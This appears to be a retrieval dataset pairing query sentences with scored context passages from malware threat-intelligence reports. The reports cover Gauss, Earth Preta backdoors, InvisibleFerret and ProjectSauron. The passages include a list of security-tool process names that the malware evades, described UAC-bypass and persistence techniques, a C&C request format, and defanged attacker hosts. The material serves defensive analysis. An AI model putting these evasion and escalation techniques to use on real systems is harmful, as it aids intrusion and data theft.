start:LMon.exesagui.exeRDTask.exekpf4gui.exeALsvc.exepxagent.exefsma32.exelicwiz.exeSavService.exeprevxcsi.exealertwall.exelivehelp.exeSAVAdminService.execsi-eui.exempf.exelookout.exesavprogress.exelpfw.exempfcm.exeemlproui.exesavmain.exeoutpost.exefameh32.exeemlproxy.exesavcleanup.exefilemon.exeAntiHook.exeendtaskpro.exesavcli.exeprocmon.exexfilter.exenetguardlite.exebackgroundscanclient.exeSniffer.exescfservice.exeoasclnt.exesdcservice.exeacs.exescfmanager.exeomnitray.exesdcdevconx.exeaupdrun.exespywareterminatorshield.exeonlinent.exesdcdevconIA.exesppfw.exespywat~1.exeopf.exesdcdevcon.exespfirewallsvc.exessupdate.exepctavsvc.execonfiguresav.exefwsrv.exeterminet.exepctav.exealupdate.exeopfsvc.exetscutynt.exepcviper.exeInstLsp.exeuwcdsvr.exeumxtray.exepersfw.exeCMain.exedfw.exeupdclient.exepgaccount.exeCavAUD.exeipatrol.exewebwall.exeprivatefirewall3.exeCavEmSrv.exepcipprev.exewinroute.exeprotect.exeCavmr.exeprifw.exeapvxdwin.exertt_crc_service.exeCavvl.exetzpfw.exeas3pf.exeschedulerdaemon.exeCavApp.exeprivatefirewall3.exeavas.exesdtrayapp.exeCavCons.exepfft.exeavcom.exesiteadv.exeCavMud.exearmorwall.exeavkproxy.exesndsrvc.exeCavUMAS.exeapp_firewall.exeavkservice.exesnsmcon.exeUUpd.exeblackd.exeavktray.exesnsupd.execavasm.exeblackice.exeavkwctrl.exeprocguard.exeCavSub.exeumxagent.exeavmgma.exeDCSUserProt.exeCavUserUpd.exekpf4ss.exeavtask.exeavkwctl.exeCavQ.exetppfdmn.exeaws.exefirewall.exeCavoar.exeblinksvc.exebgctl.exeTHGuard.exeCEmRep.exesp_rsser.exebgnt.exespybotsd.exeOnAccessInstaller.exeop_mon.exebootsafe.exexauth_service.exeSoftAct.execmdagent.exebullguard.exexfilter.exeCavSn.exeVCATCH.EXEcdas2.exezlh.exePacketizer.exeSpyHunter3.execmgrdian.exeadoronsfirewall.exePacketyzer.exewwasher.execonfigmgr.exescfservice.exezanda.exeauthfw.execpd.exescfmanager.exezerospywarele.exedvpapi.exeespwatch.exedltray.exezerospywarelite_installer.execlamd.exefgui.exedlservice.exeWireshark.exesab_wab.exefiledeleter.exeashwebsv.exetshark.exeSUPERAntiSpyware.exefirewall.exeashdisp.exerawshark.exevdtask.exefirewall2004.exeashmaisv.exeEthereal.exeasr.exefirewallgui.exeashserv.exeTethereal.exeNetguardLite.exegateway.exeaswupdsv.exeWindump.exenstzerospywarelite.exehpf_.exeavastui.exeTcpdump.execdinstx.exeiface.exeavastsvc.exeNetcap.execdas17.exeinvent.exeNetmon.exefsrt.exeipcserver.exeCV.exeVSDesktop.exeipctray.exeThe module reads the registry value SOFTWAREMicrosoftWindowsCurrentVersionReliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.String values from config file (example)GaussShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%system32winshell.ocx %temp%ws1bin.datGodelInitCache RevertCache ValidateEntry CreateEntry %windir%system32dskapi.ocx %temp%~gdl.tmpUsbDirInitCache RevertCache ValidateEntry CreateEntry %windir%system32smdk.ocx %temp%~mdk.tmpEvery module is loaded and its export functions are called as specified in the configuration.Most of the actions are logged in an encrypted (with XOR) file %temp%~shw.tmp.Sample of decrypted ~shw.tmpAfter loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.', 'Paths to the log files are taken from the TimeStampForUI configuration file.As a result, at this stage ~shw.tmp becomes a universal container file containing all the stolen data.It checks Internet connection (https) by accessing URLs specified in its resource 161.It then checks an https connection with www.google.com or www.update.windows.com.', 'If 200 OK is received in reply, it sends a request with the proxy server parameters taken from the prefs.js file of the Mozilla Firefox browser.When an Internet connection is available, it connects to its C&C servers that are specified in resource 131:Connection is established using WinInet API and is performed in two stages:GET request to the server.', 'The response from the server is expected to contain new modules, commands or configuration data.GET[C&amp;Cdomain]/userhome.php?sid=[randomstring]==&amp;uid=VfHx8fHx8fHx8fHx8fHx8fHx8fE=POST request to the server with the contents of the file ~shw.tmp that contains all data collected from the infected computer.The response from the server is decrypted using XOR and 0xACDC as the key.', 'Exfiltrated data is compressed with Zlib.The C&C connection routine is controlled by a DWORD value that is read from the registry value:[HKLMSOFTWAREMicrosoftWindowsCurrentVersionReliability]ShutdownIntervalSnapshotUIThe initial value of the counter is read from resource 181 and is equal to 56.']
will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path.|0.8058477318676606|['Files in the new arrival vector After analyzing the downloaded archive, we discovered it to be a malicious RAR file with the TONEINS malware libcef.dll and the TONESHELL malware ~List of terrorist personnel at the border.docx.', 'The infection flow for these is similar to the arrival vector type C in our previous report, with the only difference being that the fake .docx files have XOR-encrypted content to prevent detection.', 'For example, ~$Evidence information.docx is a file disguising itself as an Office Open XML document.', 'As such, it seems harmless and can even be opened by using decompression software such as 7-Zip.', '4/42We found that the threat actors have hidden a PE file in one of the archives ZIPFILERECORD structures.', 'The TONEINS malware, libcef.dll, will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path.', 'Figure 4.', 'A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure.', 'Figure 5.', 'The decryption function of TONEINS The succeeding behaviors of the infection flow are generally the same as those in our previous analysis, where we provide more details.', 'In more recent cases, the malware PUBLOAD was also being delivered through Google Drive links embedded in decoy documents.']
it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices|0.9174796008636417|['These files ended up being the TONEINS and TONESHELL malware.', 'Figure 56.', 'The files inside the archive 14 The file Documents members of delegation diplomatic from Germany.Exe, found in the Documents.rar archive, is a novel malware that communicates over the MQTT protocol.', 'In March 2023, ESET published a detailed technical report on this backdoor, which it named MQsTTang.', 'Beginning in January, we discovered that MQsTTang was being used as the new arrival vector in some of incidents we encountered, specifically in campaigns targeting individuals involved with government entities.', 'This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices.', 'Malicious actors using this technique can effectively hide the real C&C server behind the protocol.', '40/42Figure 57.', 'The 14 repository ee The file CVs Amb Office PASSPORT Ministry Of Foreign Affairs.exe, which is the malware QMAGENT, can be found in the CVs Amb.rar archive.', 'Figure 58.', 'The ee repository Conclusion Over the past year, security researchers have been discovering and analyzing Earth Pretas campaigns and toolsets.']
the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server|0.8211653803106062|['If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf.', 'If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence.', 'Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.', 'It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.', 'Command and Control (C&C) stage Earth Preta employed several tools and commands for the C&C stage.', 'For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91.', 'Figure 19.', 'The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.', ']181 for future use.', 'Figure 20.', 'PowerShell downloading malware In certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware.']
command execution.|0.7634177770491818|['RIG Exploit Kit In-Depth AnalysisTLP:CLEAR RIG:In-DepthAnalysis Contents References 2 1 Introduction 3 2 ExecutiveSummary 4 3 TheRIGTimeline 5 3.1 FirstRelease .', '.', '.', '.', '.', '.', '.']
command execution.|0.7634177770491818|['W H I T E P A P E R A FireEye Company MATRYOSHKA MINING Lessons from Operation RussianDoll, January 2016 By Michael Bailey SECURITY CONSULTINGMatryoshka Mining Lessons from Operation RussianDoll, January 2016 by Michael Bailey CONTENTS Introduction .', '.', '.', '.', '.', '.', '.']
command execution.|0.7634177770491818|['List any CEMA specific assumptions.', '2.', '(U) Mission.', 'State the commanders mission and describe cyberspace operations and EW to support the base plan or order.', '3.', '(U) Execution.', 'a.', 'Scheme of Cyberspace Electromagnetic Activities.', 'Describe how cyberspace and EW operations support the commanders intent and concept of operations.', 'Establish the priorities of support to units for each phase of the operation.', 'State how cyberspace and EW effects will degrade, disrupt, deny, and deceive the enemy.']
command execution.|1.0|"['Diagram for a heartbeat C2 message.', 'The C2 server returns JSON data instructing the backdoor with the next actions to take.', 'The JSON response contains the same two main keys: code: A value specifying an action or command args: A string or JSON dictionaries with multiple key value pairs containing the required arguments for the specified command InvisibleFerret implements a total of eight commands described below in Table 4.', 'Command Description Checks if the args value is equal to delete and if so, closes the session.', 'To notify the C2 server, it ssh_cmd sends the message string [close].', 'Command execution.', ""Extracts the command value from args['cmd'] and runs it."", 'JSON results ssh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keylogger buffer and clipboard data.', 'Reports to C2 server with JSON code ssh_clip value 3 and args containing the collected data.', '9/17ssh_run Downloads and runs the browser stealer component.']"
create a reverse shell.|0.8346447392138499|['The dropper masquerades as the same VPN we mentioned previously.', 'NIC is responsible for providing IT services, such as email and VPN access, to Indian government employees, including military personnel.', 'Another variant of the dropper deploys MargulasRAT after displaying a decoy PDF to the victim (Figure 13).', 'This infection chain uses VBScripts to persist MargulasRAT via registry, while the dropper downloads the RAT from a remote location (Figure 14).', 'MargulasRAT (Figure 15) is limited in capabilities, but does include: Screenshot capture: Capture a screenshot of the reso- lution specified by the C2, AES encrypt and send.', 'Update self: Receives an encoded binary from C2, Figure 10: ReverseRAT reverse shell.', 'Figure 11: USB device insertion notifier code snippet.', 'Figure 12: Dropper opening the decoy NIC VPN portal and setting Figure 13: Code used to download and display a decoy PDF up persistence for MargulasRAT.', 'related to the Indian Army displayed to the victim followed by activation of MargulasRAT.', '2021 Cisco.', 'All rights reserved.']
It will then create a reverse shell via ncat.exe to the server|0.803605482361494|['They have the following PDB strings, respectively: G:\\\\project\\\\APT\\\\U\\\\new\\\\u2ec\\\\Release\\\\u2ec.pdb G:\\\\project\\\\APT\\\\U\\\\new\\\\shellcode\\\\Release\\\\shellcode.pdb The string U means U disk hijacking, where U disk refers to removable drives.', '12/42USB Driver.exe then starts checking whether it is properly installed.', 'If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf.', 'If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence.', 'Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.', 'It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.', 'Command and Control (C&C) stage Earth Preta employed several tools and commands for the C&C stage.', 'For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91.', 'Figure 19.', 'The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.', ']181 for future use.']
This service has the highest privileges that can be abused for Windows 10 UAC bypass.|0.9999999999999999|['To hide this window, the tool explicitly adds new entries to HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ApplicationAssociationToasts to disable all toasts related to the protocol ms-windows-store.', '10/42Figure 15.', 'An example of the application association toast Figure 16.', 'Hiding application association toasts via the registry Once this is done, the tool starts to alter the shell command of ms-windows-store and finally triggers it using WSReset.exe.', 'SilentCleanup In Windows 10, there is a native Windows service called SilentCleanup.', 'This service has the highest privileges that can be abused for Windows 10 UAC bypass.', 'Normally, this service is intended for running %windir%\\\\system32\\\\cleanmgr.exe.', 'However, the environment variable %windir% can be hijacked and changed to any path to achieve privilege escalation.', '11/42Figure 17.', 'Malicious commands abusing the SilentCleanup service We observed that the threat actors used this technique to execute c:\\\\users\\\\public\\\\1.exe.', 'Lateral movement In this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed by Mandiant and Sophos) being used to install themselves to removable disks and create a reverse shell.']
This service has the highest privileges that can be abused for Windows 10 UAC bypass.|0.9999999999999999|['However, unlike ABPASS, it hijacks thems-windows-storeprotocol.', 'The hack tool CCPASS works as follows:It disables the application association toasts for the protocolms-windows-store.It creates a newShellin the registry.It invokes the undocumented API UserAssocSet to update the file association.It executesWSReset.exeto trigger this protocol.In Windows 10 and above, the system shows a new toast dialog for selecting the open application for the selected file type.', 'To hide this window, the tool explicitly adds new entries toHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ApplicationAssociationToaststo disable all toasts related to the protocolms-windows-store.Figure 15.', 'An example of the application association toastFigure 16.', 'Hiding application association toasts via the registryOnce this is done, the tool starts to alter the shell command ofms-windows-storeand finally triggers it usingWSReset.exe.In Windows 10, there is a native Windows service called SilentCleanup.', 'This service has the highest privileges that can be abused for Windows 10 UAC bypass.', 'Normally, this service is intended for running%windir%\\\\system32\\\\cleanmgr.exe.', 'However, the environment variable%windir%can be hijacked and changed to any path to achieve privilege escalation.Figure 17.', 'Malicious commands abusing the SilentCleanup serviceWe observed that the threat actors used this technique to executec:\\\\users\\\\public\\\\1.exe.Lateral movementIn this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed byMandiantandSophos) being used to install themselves to removable disks and create a reverse shell.We found a pair of malware comprised of a USB worm and a reverse shell includin g a USB worm and a reverse shell (detected as Worm.Win32.HIUPAN and Backdoor.Win32.ACNSHELL, respectively,) being used to spread themselves over removable drives.Figure 18 shows the infection chain for both.Figure 18.', 'HIUPAN and ACNSHELL infection flowTheUSB Driver.exeprogram first sideloadsu2ec.dll, which then loads the payload fileusb.ini.', 'They have the following PDB strings, respectively:G:\\\\project\\\\APT\\\\U\\\\new\\\\u2ec\\\\Release\\\\u2ec.pdbG:\\\\project\\\\APT\\\\U\\\\new\\\\shellcode\\\\Release\\\\shellcode.pdbThe stringUmeans U disk hijacking, where U disk refers to removable drives.USB Driver.exethen starts checking whether it is properly installed.']
UAC bypass will be executed via the AppInfo RPC service.|0.8289185739257937|['work.', 'The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next- stage payload (COOLCLIENT), which contains malicious behaviors.', 'passuac.', 'The malware will check if the process avp.exe exists.', 'If avp.exe doesnt exist, UAC bypass will be executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.', 'Figure 25.', 'UAC Bypass via the CMSTPLUA COM interface 16/42Figure 26.', 'UAC Bypass via the AppInfo RPC service According to our analysis, it reads the encrypted configuration file time.sig.', 'It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).', 'Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.Win32.TROCLIENT The backdoor TROCLIENT, which was also first disclosed in Sophoss report, is similar to COOLCLIENT.']
UAC Bypass via the CMSTPLUA COM interface|0.8634473162969727|['It installs itself by creating aservice called InstallSvc which will trigger C:\\\\programdata\\\\netsky\\\\netsky.exe online.', '2.', 'It sets up a run key for the command C:\\\\programdata\\\\netsky\\\\netsky.exe online for persistence.', '18/42online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.', 'passuac: The malware will check if the process avp.exe exists.', 'If it does not, UAC bypass is executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass is executed via token manipulation.', 'Figure 29.', 'The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.', 'Argument/Behaviors COOLCLIENT TROCLIENT install Creates a service named InstallSvc  Executes itself with passuac  19/42Sets Run Key with work/online  passuac AppInfo RPC CMSTPLUA COM  Token manipulation work/online Send portmap Connect to C&C  File operations  Keylogging  Table 3.', 'Comparison of COOLCLIENT and TROCLIENT In addition to the aforementioned malware, we also found several shellcode loaders for PlugX.']
UAC Bypass via the CMSTPLUA COM interface|0.8634473162969727|['It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).', 'Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows:Send portmapBuild connectionRead fileDelete fileKeystrokes and windows monitoringThe backdoor TROCLIENT, which was also first disclosed in Sophoss report, is similar to COOLCLIENT.', 'However, this backdoor has an anti-debugging technique, which will check if the running processes have the stringsdbg.exeorolly.Figure 27.', 'TROCLIENT anti-debugging technique.Figure 28 shows the whole execution flow of TROCLIENT.Figure 28.', 'Execution flow of TROCLIENTThe arguments of TROCLIENT provide the following capabilities:install.There are two waysto determine the method of installation for TROCLIENT, detailed here:It installs itself by creating aservice called InstallSvc which will trigger C:\\\\programdata\\\\netsky\\\\netsky.exe online.It sets up a run key for the commandC:\\\\programdata\\\\netsky\\\\netsky.exe online for persistence.online:It will read the next stage payloads,free.plgandmain.plg, and inject them intodllhost.exe.passuac:The malware will check if the processavp.exeexists.', 'If it does not, UAC bypass is executed via the CMSTPLUA COM interface.', 'Ifavp.exeexists, UAC bypass is executed viatoken manipulation.Figure 29.', 'The capabilities of three different argumentsThis backdoor provides the following capabilities:Read fileDelete fileMonitor keystrokes and windowsThere are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.Argument/BehaviorsCOOLCLIENTTROCLIENTinstallCreates a service named InstallSvcExecutes itself with passuacSets Run Key with work/onlinepassuacAppInfo RPCCMSTPLUA COMToken manipulationwork/onlineSend portmapConnect to C&CFile operationsKeyloggingTable 3.', 'Comparison of COOLCLIENT and TROCLIENTIn addition to the aforementioned malware, we also found several shellcode loaders forPlugX.', 'Since it is a known malware family, we will not expand on its details in this blog entry.ExfiltrationBased on our telemetry, we found that Earth Preta used multiple approaches to exfiltrate sensitive data from the victims.', 'For example, in some cases, we observed that WinRAR and curl (or cURL) were leveraged to collect and transfer data to the threat actors server.']
UAC Bypass via the AppInfo RPC service|0.7663336531393982|['work.', 'The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next- stage payload (COOLCLIENT), which contains malicious behaviors.', 'passuac.', 'The malware will check if the process avp.exe exists.', 'If avp.exe doesnt exist, UAC bypass will be executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.', 'Figure 25.', 'UAC Bypass via the CMSTPLUA COM interface 16/42Figure 26.', 'UAC Bypass via the AppInfo RPC service According to our analysis, it reads the encrypted configuration file time.sig.', 'It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).', 'Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.Win32.TROCLIENT The backdoor TROCLIENT, which was also first disclosed in Sophoss report, is similar to COOLCLIENT.']
UAC bypass is executed via token manipulation.|0.7730800319811387|['2.', 'It sets up a run key for the command C:\\\\programdata\\\\netsky\\\\netsky.exe online for persistence.', '18/42online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.', 'passuac: The malware will check if the process avp.exe exists.', 'If it does not, UAC bypass is executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass is executed via token manipulation.', 'Figure 29.', 'The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.', 'Argument/Behaviors COOLCLIENT TROCLIENT install Creates a service named InstallSvc  Executes itself with passuac  19/42Sets Run Key with work/online  passuac AppInfo RPC CMSTPLUA COM  Token manipulation work/online Send portmap Connect to C&C  File operations  Keylogging  Table 3.', 'Comparison of COOLCLIENT and TROCLIENT In addition to the aforementioned malware, we also found several shellcode loaders for PlugX.', 'Since it is a known malware family, we will not expand on its details in this blog entry.']
UAC bypass is executed|0.7626257929937913|"['Decoded shellcode in mpsvc.dll In the end, the shellcode in mpsvc.mui has another different piece of hard-coded bytes, which will decompress by RtlDecompressBuffer to the final malicious executable (Figure 4).', 'www.talent-jump.com/article/2020/02/17/CLAMBLING-A-New-Backdoor-Base-On-Dropbox-en/ 4/232/18/2020 CLAMBLING - A New Backdoor Base On Dropbox (EN) | Figure 4.', 'The final malicious executable in buffer.', 'Sample Analysis The final malicious executable sample we extracted has numerous features.', 'Here is the analysis of some major functions.', 'Bypass UAC This sample can bypass UAC via .NET.', 'It is not a new technique which was disclosed in 2017 , the threat actor only changes the GUID to 9BA94120-7E02-46ee- [1] ADC6-10640B04F93B (Figure 5) and specify the location of DLL file which will load by the .NET application in the elevated process.', 'www.talent-jump.com/article/2020/02/17/CLAMBLING-A-New-Backdoor-Base-On-Dropbox-en/ 5/232/18/2020 CLAMBLING - A New Backdoor Base On Dropbox (EN) | Figure 5.', 'Code snippet of bypass UAC.', 'Persistence There are two ways to persist.', 'Register as a startup program in HKEY_CURRENT_USER\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersio n\\\\\\\\Run if it has no privileged (Figure 6).']"
It creates a new Shell in the registry.|1.0|['Figure 14.', 'Code similarities in CCPASS and ucmMsStoreProtocolMethod It works in a similar way to ABPASS.', 'However, unlike ABPASS, it hijacks the ms-windows-store protocol.', 'The hack tool CCPASS works as follows: 1.', 'It disables the application association toasts for the protocol ms-windows-store.', '2.', 'It creates a new Shell in the registry.', '3.', 'It invokes the undocumented API UserAssocSet to update the file association.', '4.', 'It executes WSReset.exe to trigger this protocol.']
it installs itself to %programdata% and then sets the registry run key for persistence.|0.9019734306210733|['Figure 18.', 'HIUPAN and ACNSHELL infection flow The USB Driver.exe program first sideloads u2ec.dll, which then loads the payload file usb.ini.', 'They have the following PDB strings, respectively: G:\\\\project\\\\APT\\\\U\\\\new\\\\u2ec\\\\Release\\\\u2ec.pdb G:\\\\project\\\\APT\\\\U\\\\new\\\\shellcode\\\\Release\\\\shellcode.pdb The string U means U disk hijacking, where U disk refers to removable drives.', '12/42USB Driver.exe then starts checking whether it is properly installed.', 'If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf.', 'If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence.', 'Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.', 'It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.', 'Command and Control (C&C) stage Earth Preta employed several tools and commands for the C&C stage.', 'For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91.', 'Figure 19.']
It invokes the undocumented API UserAssocSet to update the file association.|1.0|['However, unlike ABPASS, it hijacks the ms-windows-store protocol.', 'The hack tool CCPASS works as follows: 1.', 'It disables the application association toasts for the protocol ms-windows-store.', '2.', 'It creates a new Shell in the registry.', '3.', 'It invokes the undocumented API UserAssocSet to update the file association.', '4.', 'It executes WSReset.exe to trigger this protocol.', 'In Windows 10 and above, the system shows a new toast dialog for selecting the open application for the selected file type.', 'To hide this window, the tool explicitly adds new entries to HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ApplicationAssociationToasts to disable all toasts related to the protocol ms-windows-store.']
It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.|0.9076721626913534|['Execution flow of TROCLIENT The arguments of TROCLIENT provide the following capabilities: install.', 'There are two waysto determine the method of installation for TROCLIENT, detailed here: 1.', 'It installs itself by creating aservice called InstallSvc which will trigger C:\\\\programdata\\\\netsky\\\\netsky.exe online.', '2.', 'It sets up a run key for the command C:\\\\programdata\\\\netsky\\\\netsky.exe online for persistence.', '18/42online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.', 'passuac: The malware will check if the process avp.exe exists.', 'If it does not, UAC bypass is executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass is executed via token manipulation.', 'Figure 29.', 'The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.']
It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).|1.0|['If avp.exe doesnt exist, UAC bypass will be executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.', 'Figure 25.', 'UAC Bypass via the CMSTPLUA COM interface 16/42Figure 26.', 'UAC Bypass via the AppInfo RPC service According to our analysis, it reads the encrypted configuration file time.sig.', 'It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).', 'Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.Win32.TROCLIENT The backdoor TROCLIENT, which was also first disclosed in Sophoss report, is similar to COOLCLIENT.', 'However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings dbg.exe or olly.', '17/42Figure 27.', 'TROCLIENT anti-debugging technique.', 'Figure 28 shows the whole execution flow of TROCLIENT.']
It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).|1.0|['Execution flow of COOLCLIENTThe arguments of COOLCLIENT provide the following capabilities:install.There are several ways to install COOLCLIENT, detailed here:It installs itself by creating an InstallSvc service called InstallSvc which will trigger googleupdate.exe work..It sets up a run key for via the commandC:\\\\ProgramData\\\\GoogleUpdate\\\\googleupdate.exe workfor persistence.work.The malware will continue to read and decryptgoopdate.jaand inject it intowinver.exefor the next-stage payload (COOLCLIENT), which contains malicious behaviors.passuac.The malware will check if the processavp.exeexists.', 'Ifavp.exedoesnt exist, UAC bypass will be executed via the CMSTPLUA COM interface.', 'Ifavp.exeexists, UAC bypass will be executed via the AppInfo RPC service.Figure 25.', 'UAC Bypass via the CMSTPLUA COM interfaceFigure 26.', 'UAC Bypass via the AppInfo RPC serviceAccording to our analysis, it reads the encrypted configuration filetime.sig.', 'It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).', 'Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows:Send portmapBuild connectionRead fileDelete fileKeystrokes and windows monitoringThe backdoor TROCLIENT, which was also first disclosed in Sophoss report, is similar to COOLCLIENT.', 'However, this backdoor has an anti-debugging technique, which will check if the running processes have the stringsdbg.exeorolly.Figure 27.', 'TROCLIENT anti-debugging technique.Figure 28 shows the whole execution flow of TROCLIENT.Figure 28.', 'Execution flow of TROCLIENTThe arguments of TROCLIENT provide the following capabilities:install.There are two waysto determine the method of installation for TROCLIENT, detailed here:It installs itself by creating aservice called InstallSvc which will trigger C:\\\\programdata\\\\netsky\\\\netsky.exe online.It sets up a run key for the commandC:\\\\programdata\\\\netsky\\\\netsky.exe online for persistence.online:It will read the next stage payloads,free.plgandmain.plg, and inject them intodllhost.exe.passuac:The malware will check if the processavp.exeexists.', 'If it does not, UAC bypass is executed via the CMSTPLUA COM interface.']
Delete file|0.8088173139059265|"['stop Stop a service.', 'pause Pause a service.', 'continue Make a paused service resume execution.', 'create Create a new service.', 'config Change configuration for a service.', 'delete Delete a service.', 'desc Change the description of a service.', 'To get help for a specific command use: %s {command} -h sinfo System information sinfo Usage: sinfo [-a] For any inquiries, contact intelreports@kaspersky.com Page 18 of 33The ProjectSauron APT.', 'Technical analysis -a Show volume information for all drives (removable, network etc).', ""Warning, use this option with care since it causes cdrom-spinup, little network traffic and floppy-noise skip Filter the input lines from stdout and print only those that contain (or do not contain, depending on the command line switches) the particular substring sl Port scanner with TCP/UDP/ICMP support sl [-?bhijnMpPrTUvVz] [-cdDgmq <n>] [-tu <n>[,<n>-<n>]] IP[,IP-IP] (use a single '-' character to read ip's from stdin) -?"", '- Shows this help text -b - Get port banners -c - Timeout for TCP and UDP attempts (ms).']"
Delete file|0.7691309708425216|['5 Creates a file to write to, deleting it if it already exists.', 'Combined with E command to download a file to the system.', 'E Writes data from C2 to a file opened using the 5 command.', 'Combined with 5 command to download a file to the system.', '6 Reads a file, which effectively uploads the file to the C2.', '7 Delete a specified file.', '8 Execute a command using WinExec.', 'Responds to C2 with s if successful or r if unsuccessful.', '9 Timestomps.', 'Sets a specified files timestamps to match that of a system file in the System32 directory.', 'Table 5: Command handler in Psylo that differs dramatically from FakeMAnother discovery we made while researching this blog is an overlap between Psylo infrastructure and a Trojan focused on compromising Android mobile devices.']
Keylogging|0.8650775050655931|"['Require encryption for employees, especially employees working remotely.', 'This includes whole-disc, such as 256- bit AES, and network encryption via SSL or TLS.', 'For enterprises, Recorded Future can monitor for potential typosquat domains weaponized in phishing attacks.', 'This includes not only the domains belonging to one organization, but third-party partners and vendors with enterprise network access.', 'www.recordedfuture.com | Recorded Future CTA-2022-0802 6CYBER THREAT ANALYSIS The Recorded Future Platform can also assist with Through the use of process monitoring, monitor for the the detection of compromised credential information execution and command of binaries involved in data linked to valid accounts to assist in providing context destruction activity, such as vssadmin, wbadmin, and surrounding suspicious user behavior that may include bcdedit.', 'keylogging activity.', 'Recorded Future Platform users can Monitor for the creation of suspicious file modification continue to monitor underground sources to identify the activity, particularly large quantities of file modifications spyware and keylogging tools that are likely to be the in user directories.', 'most harmful to their immediate infrastructure or supply Consider keeping sensitive client information on systems chain.', 'disconnected from the internet or segmented from the rest of the corporate network.', 'Since ransomware will Ransomware encrypt all files on a victim system and often will search Maintain offline backups of your organizations data and for directories on the network (such as networked file ensure that these backups stay up to date to prevent data loss shares) to also encrypt, moving highly sensitive customer in the event of a ransomware infection.', 'Additionally, Recorded data to a system with no internet access or access to the Future recommends the following mitigations to reduce overall rest of the network will minimize the access ransomware risk: would have to those files.']"
